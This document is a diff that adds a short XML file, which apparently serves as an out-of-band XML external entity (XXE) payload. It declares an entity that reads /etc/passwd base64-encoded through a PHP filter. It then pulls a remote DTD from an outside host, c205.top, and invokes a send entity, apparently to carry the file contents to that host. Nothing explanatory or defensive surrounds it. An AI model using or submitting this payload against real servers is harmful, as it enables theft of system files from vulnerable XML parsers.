@@ -1,0 +1,8 @@
+<?xml version="1.0"?>
+<!DOCTYPE message [
+    <!ENTITY % remote SYSTEM "http://c205.top/xml.dtd">  
+    <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file://etc/passwd">
+    %remote;
+    %send;
+]>
+<message>1234</message>
